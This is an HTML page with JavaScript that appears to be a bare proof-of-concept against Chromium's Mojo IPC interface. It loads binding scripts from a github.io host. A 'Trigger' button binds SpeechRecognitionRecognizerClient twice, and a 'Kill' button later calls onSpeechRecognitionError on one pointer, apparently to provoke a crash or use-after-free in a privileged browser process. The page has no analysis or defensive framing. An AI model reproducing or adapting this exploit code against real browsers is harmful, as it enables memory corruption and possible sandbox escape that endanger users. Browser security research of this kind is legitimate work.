<html>
  <head>
    <script src="https://b1n1sh.github.io/FaceDetector/mojo_bindings.js"></script>    
    <script src="https://b1n1sh.github.io/FaceDetector/media/mojo/mojom/speech_recognition_service.mojom.js"></script>
    </head>
    <body>
    <pre id='log'></pre>
      <button id="myBtn" style="height: 200px;width: 200px">Trigger</button>
      <button id="myBtn2" style="height: 200px;width: 200px">Kill</button>
      <script>
      function mylog(string) {
          var log = document.getElementById('log');
          if (log) {        
              log.innerText += string+'\n';
          }
      }

      /*
      function TextDetectionImpl() {
          this.binding = new mojo.Binding(shapeDetection.mojom.TextDetection, this);
      }

      TextDetectionImpl.prototype = {
        detect: async (bitmap_data) => {
          console.log("text detect");
        }
      };

      function createTextDetection() {
        Face_Detection = new TextDetectionImpl();
        Face_Detection_ptr = new shapeDetection.mojom.TextDetectionPtr();
        Face_Detection.binding.bind(mojo.makeRequest(Face_Detection_ptr));
        return Face_Detection_ptr;
      }
      */

      let ptr;
      let ptr2;

      function trigger()
      {        
        ptr = new media.mojom.SpeechRecognitionRecognizerClientPtr();
        Mojo.bindInterface(media.mojom.SpeechRecognitionRecognizerClient.name, mojo.makeRequest(ptr).handle);
        mylog('media.mojom.SpeechRecognitionRecognizerClient 1');

        ptr2 = new media.mojom.SpeechRecognitionRecognizerClientPtr();
        Mojo.bindInterface(media.mojom.SpeechRecognitionRecognizerClient.name, mojo.makeRequest(ptr2).handle);

        mylog('media.mojom.SpeechRecognitionRecognizerClient 2');        
      }

      function kill()
      {
        setTimeout(()=> { ptr.onSpeechRecognitionError();}, 10000);
      }

      document.getElementById("myBtn").addEventListener("click", trigger);
      document.getElementById("myBtn2").addEventListener("click", kill);
      </script>
    </body>
</html>